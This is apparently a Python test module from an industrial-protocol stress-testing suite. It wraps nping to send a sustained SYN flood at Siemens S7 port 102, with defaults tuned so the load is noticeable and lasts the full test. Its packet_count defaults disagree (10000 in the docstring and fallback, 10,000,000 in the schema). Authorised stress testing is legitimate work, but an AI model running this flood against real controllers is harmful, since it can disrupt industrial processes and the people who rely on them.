"""
測項：Siemens S7 通訊協定 Port SYN Flood
分類：Siemens S7（預設埠 102）
底層工具：nping
對應原始命令：nping --tcp --flags SYN --delay 10ms -p 102 <IP> --count 1000

預設參數：delay_ms 預設為 1ms（≈1000pps），packet_count 下限預設為 10000，
確保預設參數就能對目標造成有感的負載。

設計說明：nping 的 --count 是固定的總封包數，這點與 dnp3/iec104/modbus 的
syn_flood.py（--rate + count=rate*duration，會隨測試時長等比例延伸）不同；
若單純依 delay 換算出的封包量而不考慮 duration，測試可能在 duration 尚未
結束前就把封包送完並提前收工，之後即使 duration 還有剩餘時間也不會再有
任何流量。因此 count 改採「delay 換算出的 pps × duration」與使用者填的
packet_count 兩者取較大值：預設情況下確保封包持續送到整個 duration 結束；
若使用者刻意把 packet_count 填得比 duration 換算值更大，也會被尊重。
"""
from ..common import run_subprocess, clamp_duration

NAME = "Siemens S7 Port SYN Flood"
CATEGORY = "Siemens S7"
PROTOCOL = "TCP"
DEFAULT_PORT = 102
TEST_TYPE = "traffic"  # SYN flood，靠封包速率造成負擔


def get_param_schema() -> dict:
    return {
        "delay_ms": {"type": "int", "default": 1, "min": 1, "max": 1000, "desc": "--delay，封包間隔毫秒數（預設 1ms ≈ 1000pps）"},
        "packet_count": {
            "type": "int", "default": 10000000, "min": 1, "max": 50000000,
            "desc": "--count 下限（實際送出數量會是「delay 換算 pps × duration」與本值取較大者，確保打滿整個測試時長）",
        },
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    delay = int(params.get("delay_ms", 1))
    min_count = int(params.get("packet_count", 10000))

    implied_rate = max(1, int(1000 / delay))  # delay(ms) 換算出的 pps
    duration_count = implied_rate * duration
    count = max(min_count, duration_count)  # 確保封包量至少能撐滿整個 duration

    cmd = [
        "nping", "--tcp", "--flags", "SYN", "-p", str(port),
        "--delay", f"{delay}ms", "--count", str(count), "-v", "0", target,
    ]
    return run_subprocess(cmd, duration + 10, stop_event, log_fn)
